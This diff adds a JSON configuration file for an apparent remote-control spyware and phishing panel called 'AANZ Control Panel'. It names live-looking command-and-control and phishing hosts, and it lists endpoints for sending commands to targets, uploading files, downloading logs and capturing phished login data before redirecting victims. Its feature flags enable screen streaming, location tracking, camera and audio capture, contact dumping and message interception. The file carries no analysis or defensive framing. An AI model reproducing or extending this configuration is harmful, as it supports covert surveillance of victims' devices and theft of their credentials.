@@ -1,0 +1,40 @@
+{
+  "base_url": "http://server-panel-2.jhonaleystore.id:2864",
+  "phishing_url": "http://senzhitambanget.bangsaa.web.id:2013",
+  "version": "1.0.0",
+  "app_name": "AANZ Control Panel",
+  "endpoints": {
+    "send_command": "/api/send-command",
+    "list_targets": "/api/list-targets",
+    "get_notifications": "/api/get-notifications",
+    "get_response": "/api/get-response",
+    "get_devices": "/api/list-targets",
+    "upload_file": "/api/upload",
+    "download_logs": "/api/download-logs"
+  },
+  "phishing_endpoints": {
+    "login_page": "/phishing/login",
+    "capture_data": "/phishing/capture",
+    "redirect_url": "https://google.com"
+  },
+  "settings": {
+    "polling_interval": 10,
+    "request_timeout": 15,
+    "max_retry": 3,
+    "enable_logging": true,
+    "debug_mode": false
+  },
+  "features": {
+    "screen_stream": true,
+    "location_tracking": true,
+    "camera_capture": true,
+    "audio_recording": true,
+    "contact_dump": true,
+    "message_intercept": true
+  },
+  "security": {
+    "api_key_required": false,
+    "encryption_enabled": false,
+    "ssl_verify": false
+  }
+}
